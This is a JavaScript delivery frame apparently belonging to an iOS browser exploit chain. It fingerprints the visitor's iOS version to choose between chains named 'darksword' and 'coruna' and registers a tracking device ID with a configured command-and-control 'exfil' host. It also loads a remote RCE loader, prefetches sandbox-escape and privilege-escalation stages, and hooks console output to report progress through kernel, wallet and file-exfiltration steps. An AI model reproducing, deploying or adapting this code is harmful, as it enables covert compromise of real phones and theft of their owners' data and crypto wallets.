(function () {
  'use strict';

  var STAGE = { boot: 8, loader: 18, worker: 42, sbx0: 58, sbx1: 72, pe: 86, post: 100 };
  window.__LAB_CHAIN__ = window.__LAB_CHAIN__ || '';

  function trimSlash(s) {
    return String(s || '').replace(/\/+$/, '');
  }

  function hostOnly(raw) {
    return String(raw || '').replace(/^https?:\/\//, '').split('/')[0].split(':')[0];
  }

  function persistChannelCode(code) {
    code = String(code || '').trim().slice(0, 64);
    if (!code) return '';
    try { window.__LAB_CHANNEL_CODE__ = code; } catch (e0) {}
    try { window.__CORUNA_CHANNEL__ = code; } catch (e1) {}
    try { if (sessionStorage) sessionStorage.setItem('lab_channel_code', code); } catch (e2) {}
    try { if (localStorage) localStorage.setItem('lab_channel_code', code); } catch (e3) {}
    return code;
  }

  function labChannelCode() {
    try {
      if (window.__LAB_CHANNEL_CODE__) return String(window.__LAB_CHANNEL_CODE__);
    } catch (e0) {}
    try {
      var stored = sessionStorage.getItem('lab_channel_code') || localStorage.getItem('lab_channel_code') || '';
      if (stored) return persistChannelCode(stored);
    } catch (e1) {}
    try {
      var m = String(location.pathname || '').match(/\/channel\/([0-9A-Za-z]\.[0-9A-Za-z]\.[0-9A-Za-z]{2})\//i);
      if (m && m[1]) return persistChannelCode(m[1].toUpperCase());
    } catch (e2) {}
    return '';
  }

  function assetBase() {
    try {
      if (window.__LAB_DELIVERY_HOST__) return trimSlash(window.__LAB_DELIVERY_HOST__);
    } catch (e0) {}
    var origin = '';
    try {
      if (location.origin && location.origin !== 'null') origin = trimSlash(location.origin);
    } catch (e1) {}
    var path = '/next-chain';
    try {
      var cfg = window.NEWS2_CONFIG || {};
      if (cfg.deliveryPath) path = String(cfg.deliveryPath);
    } catch (e2) {}
    if (path.charAt(0) !== '/') path = '/' + path;
    return origin + path.replace(/\/+$/, '');
  }

  function pageOrigin() {
    try {
      if (location.origin && location.origin !== 'null') return trimSlash(location.origin);
    } catch (e) {}
    return '';
  }

  // Browser /api/ds/* → C2 (NEWS2_CONFIG.exfil). Delivery has no PHP.
  function apiBase() {
    try {
      var ex = (window.__LAB_EXFIL__ && window.__LAB_EXFIL__.host)
        ? window.__LAB_EXFIL__
        : ((window.NEWS2_CONFIG && window.NEWS2_CONFIG.exfil) || null);
      if (ex && ex.host) {
        var h = hostOnly(ex.host);
        var tls = ex.tls === true || ex.prefer_https === true || Number(ex.https_port) === 443;
        var port = Number(tls ? (ex.https_port || 443) : (ex.http_port || 80)) || (tls ? 443 : 80);
        var origin = (tls ? 'https://' : 'http://') + h;
        if (port && port !== 443 && port !== 80) origin += ':' + port;
        return origin;
      }
    } catch (e) {}
    return pageOrigin();
  }

  function applyExfil(ex) {
    if (!ex || !ex.host) return;
    window.__LAB_EXFIL__ = {
      host: hostOnly(ex.host),
      domain: hostOnly(ex.domain || ex.host),
      http_port: ex.http_port != null ? Number(ex.http_port) : 80,
      https_port: ex.https_port != null ? Number(ex.https_port) : 80,
      tls: !!ex.tls,
      prefer_https: !!ex.prefer_https,
      stats_url: ex.stats_url || '',
      stats_url_direct: ex.stats_url_direct || '',
      delivery_stats_url: ex.delivery_stats_url || '',
    };
  }

  function notify(stage, progress, label) {
    try {
      if (window.parent && window.parent !== window) {
        window.parent.postMessage({
          type: 'ds-stage',
          stage: stage,
          progress: progress,
          chain: window.__LAB_CHAIN__ || '',
          label: label || stage
        }, '*');
      }
    } catch (e) {}
  }

  labChannelCode();
  window.__LAB_DELIVERY_HOST__ = assetBase();
  try {
    if (window.NEWS2_CONFIG && window.NEWS2_CONFIG.exfil) applyExfil(window.NEWS2_CONFIG.exfil);
  } catch (eCfg) {}

  var base = assetBase();
  var api = apiBase();

  notify('boot', STAGE.boot, 'frame_boot');
  console.log('[Frame] Loaded at', new Date().toISOString());
  fetch(api + '/api/ds/log?text=frame.html loaded at ' + new Date().toISOString(), { method: 'GET' }).catch(function () {});

  function resolveExfilInline() {
    try {
      var xhr = new XMLHttpRequest();
      xhr.open('GET', api + '/api/ds/chain-targets', false);
      xhr.send();
      if (xhr.status >= 200 && xhr.status < 300 && xhr.responseText) {
        var d = JSON.parse(xhr.responseText);
        if (d.exfil && d.exfil.host) {
          applyExfil(d.exfil);
          api = apiBase();
          return;
        }
      }
    } catch (e) {}
    if (!window.__LAB_EXFIL__ || !window.__LAB_EXFIL__.host) {
      var h = hostOnly(api || location.hostname);
      applyExfil({
        host: h,
        domain: h,
        http_port: (location.port && Number(location.port)) || (location.protocol === 'https:' ? 443 : 80),
        https_port: (location.port && Number(location.port)) || (location.protocol === 'https:' ? 443 : 80),
        tls: location.protocol === 'https:',
        prefer_https: location.protocol === 'https:',
      });
      api = apiBase();
    }
  }
  resolveExfilInline();

  function parseIosVersion() {
    var ua = navigator.userAgent;
    var m = /iPhone OS ([0-9_]+)/.exec(ua);
    if (!m) m = /CPU (?:iPhone )?OS ([0-9_]+)/.exec(ua);
    if (!m) m = /CPU OS ([0-9_]+)/.exec(ua);
    if (!m) {
      m = /Version\/(\d+)\.(\d+)/.exec(ua);
      return m ? [parseInt(m[1], 10), parseInt(m[2], 10)] : null;
    }
    return m[1].split('_').map(function (p) { return parseInt(p, 10); });
  }

  function cmpVer(a, b) {
    for (var i = 0; i < 3; i++) {
      var ai = (a && a[i]) || 0, bi = (b && b[i]) || 0;
      if (ai < bi) return -1;
      if (ai > bi) return 1;
    }
    return 0;
  }

  function isDarkSwordRange(v) {
    if (!v || !v.length) return false;
    var maj = v[0] || 0, min = v[1] || 0, pat = v[2] || 0;
    if (maj !== 18) return false;
    if (min === 5 && pat === 0) return true;
    if (min === 6 && (pat === 0 || pat === 1 || pat === 2)) return true;
    return false;
  }

  function loadScript(src, onload, attempt) {
    attempt = attempt || 0;
    var s = document.createElement('script');
    s.async = false;
    s.src = src + (src.indexOf('?') >= 0 ? '&' : '?') + '_=' + Date.now();
    s.onload = function () { if (onload) onload(); };
    s.onerror = function () {
      if (attempt < 4) {
        setTimeout(function () { loadScript(src, onload, attempt + 1); }, 200 * (attempt + 1));
      }
    };
    (document.body || document.documentElement).appendChild(s);
  }

  var ios = parseIosVersion();
  function chainIdForIos(v) {
    return isDarkSwordRange(v) ? 'darksword' : 'coruna';
  }
  var chain = chainIdForIos(ios);
  var apiPlan = null;
  try {
    var xhrPlan = new XMLHttpRequest();
    xhrPlan.open('GET', api + '/api/ds/chain-targets?ios=' + encodeURIComponent(ios ? ios.join('.') : ''), false);
    xhrPlan.send();
    if (xhrPlan.status >= 200 && xhrPlan.status < 300 && xhrPlan.responseText) {
      apiPlan = JSON.parse(xhrPlan.responseText);
      if (apiPlan.chain) chain = apiPlan.chain;
      if (apiPlan.exfil) {
        applyExfil(apiPlan.exfil);
        api = apiBase();
      }
      window.__LAB_BAND__ = apiPlan.band || null;
      window.__LAB_GATED__ = !!apiPlan.gated;
      window.__LAB_RECOMMENDED_WORKER__ = apiPlan.recommended_worker || (apiPlan.band && apiPlan.band.recommended_worker) || '';
      window.__LAB_FALLBACK_WORKERS__ = apiPlan.fallback_workers || (apiPlan.band && apiPlan.band.fallback_workers) || [];
      window.__LAB_S5_MODULE__ = apiPlan.s5_module || '';
      window.__LAB_ENTRY__ = apiPlan.entry_point || apiPlan.redirect_to || '';
      window.__LAB_USABLE_GRADE__ = (apiPlan.band && apiPlan.band.usable_grade) || '';
      window.__LAB_USABLE_FOR_ATTEMPT__ = !!(apiPlan.band && apiPlan.band.usable_for_attempt);
      try {
        var pw = window.__LAB_RECOMMENDED_WORKER__;
        if (pw) {
          var l = document.createElement('link');
          l.rel = 'preload'; l.as = 'script'; l.href = base + '/' + pw;
          document.head.appendChild(l);
        }
        ['sbx0_main_18.4.js', 'sbx1_main.js', 'pe_worker.js', 'pe_main.js'].forEach(function (f) {
          var l2 = document.createElement('link');
          l2.rel = 'prefetch'; l2.href = base + '/' + f;
          document.head.appendChild(l2);
        });
      } catch (ePre) {}
    }
  } catch (ePlan) {}
  window.__LAB_CHAIN__ = chain;
  try {
    if (window.parent && window.parent !== window) {
      window.parent.postMessage({
        type: 'ds-chain',
        chain: chain,
        ios: ios ? ios.join('.') : ''
      }, '*');
    }
  } catch (eChain) {}

  (function bindDeviceUuid() {
    function genUuid32() {
      try {
        var a = new Uint8Array(16);
        (window.crypto || window.msCrypto).getRandomValues(a);
        var hex = '';
        for (var i = 0; i < a.length; i++) hex += ('0' + a[i].toString(16)).slice(-2);
        return hex.toUpperCase();
      } catch (e) {
        return (Date.now().toString(16) + Math.random().toString(16).slice(2) + '0000000000000000').slice(0, 32).toUpperCase();
      }
    }
    try {
      var q = new URLSearchParams(location.search);
      var du = q.get('deviceUUID') || q.get('device') || q.get('uuid') || '';
      if (!du) {
        try { du = localStorage.getItem('lab_device_uuid') || ''; } catch (eLs) {}
      }
      if (!du) {
        try {
          var m = document.cookie.match(/(?:^|; )lab_device_uuid=([^;]*)/);
          du = m ? decodeURIComponent(m[1]) : '';
        } catch (eCk) {}
      }
      if (!du || String(du).replace(/-/g, '').length < 16) du = genUuid32();
      window.__LAB_DEVICE_UUID__ = String(du).replace(/-/g, '').toUpperCase().slice(0, 32);
      try { localStorage.setItem('lab_device_uuid', window.__LAB_DEVICE_UUID__); } catch (e1) {}
      try {
        document.cookie = 'lab_device_uuid=' + encodeURIComponent(window.__LAB_DEVICE_UUID__) + ';path=/;max-age=31536000;SameSite=Lax';
      } catch (eC2) {}
    } catch (e0) {
      try { window.__LAB_DEVICE_UUID__ = genUuid32(); } catch (e00) {}
    }
  })();

  (function registerFrameDevice() {
    try {
      var id = window.__LAB_DEVICE_UUID__ || '';
      if (!id) return;
      var iosStr = ios ? ios.join('.') : '';
      var channel = labChannelCode();
      var regHeaders = { 'Content-Type': 'application/json', 'X-Device-UUID': id };
      var regBody = JSON.stringify({
        deviceUUID: id,
        user_agent: navigator.userAgent,
        userAgent: navigator.userAgent,
        ios: iosStr,
        ios_version: iosStr,
        chain: chain === 'blocked' ? 'out_of_scope' : chain,
        channelCode: channel
      });
      fetch(api + '/api/ds/device/register', {
        method: 'POST',
        headers: regHeaders,
        credentials: 'omit',
        body: regBody
      }).then(function (r) { return r.ok ? r.json() : null; }).then(function (d) {
        var canon = (d && d.device) ? String(d.device).replace(/-/g, '').toUpperCase() : '';
        if (canon) {
          window.__LAB_DEVICE_UUID__ = canon;
          try { localStorage.setItem('lab_device_uuid', canon); } catch (e3) {}
        }
      }).catch(function () {});
    } catch (e) {}
  })();

  console.log('[Frame] iOS version:', ios ? ios.join('.') : 'unknown');
  console.log('[Frame] Chain selected:', chain);
  (function () {
    var id = window.__LAB_DEVICE_UUID__ || '';
    var q = 'text=' + encodeURIComponent('Chain selected: ' + chain + ' for iOS ' + (ios ? ios.join('.') : 'unknown'));
    if (id) q += '&deviceUUID=' + encodeURIComponent(id) + '&device=' + encodeURIComponent(id);
    var ch = labChannelCode();
    if (ch) q += '&channelCode=' + encodeURIComponent(ch);
    fetch(api + '/api/ds/log?' + q, {
      method: 'GET',
      headers: id ? { 'X-Device-UUID': id } : {}
    }).catch(function () {});
  })();

  function setHold(kind) {
    try {
      var ts = String(Date.now());
      localStorage.setItem('__ds_chain_hold', ts);
      sessionStorage.setItem('__ds_chain_hold', ts);
      if (kind === 'rce' || kind === 'all') {
        localStorage.setItem('__ds_rce_hold', ts);
        sessionStorage.setItem('__ds_rce_hold', ts);
      }
    } catch (e) {}
  }

  if (chain === 'darksword' || chain === 'ghostwave') {
    setHold('rce');
    notify('loader', STAGE.loader);
    loadScript(base + '/rce_loader.js', function () {
      notify('worker', STAGE.worker);
    });
  } else if (chain === 'coruna' || chain === 'silkpath') {
    notify('loader', STAGE.loader);
  } else {
    notify('loader', STAGE.loader);
  }

  var _log = console.log;
  console.log = function () {
    var msg = Array.prototype.join.call(arguments, ' ');
    if (/stage1|RCE success|handoff ok|Inside stage2|inside stage1/i.test(msg)) notify('worker', STAGE.worker);
    if (/after get js|sbx0_main/i.test(msg)) notify('sbx0', STAGE.sbx0);
    if (/sbx1_main|mediaplaybackd|\[patch\] loaded bootstrap/i.test(msg)) notify('sbx1', STAGE.sbx1);
    if (/pe_main|kernel_base|kernel_slide|pe_main_eval|pe_main_start|pe spawned|Spawning PE|pe bootstrap|nowait_exit|pe exfil grace|pe exfil wait/i.test(msg)) notify('pe', STAGE.pe);
    if (/file_downloader_ok|chain.?complete/i.test(msg)) notify('post', STAGE.post);
    else if (/file_downloader_start|S5_post|post \/stats|saved .* bytes|wallet_memory|wallet_crypto|coruna_bootstrap_fetch|coruna_s5/i.test(msg)) {
      notify('pe', Math.max(STAGE.pe, 90), '權限提升 · 後台收尾');
    }
    return _log.apply(console, arguments);
  };
})();
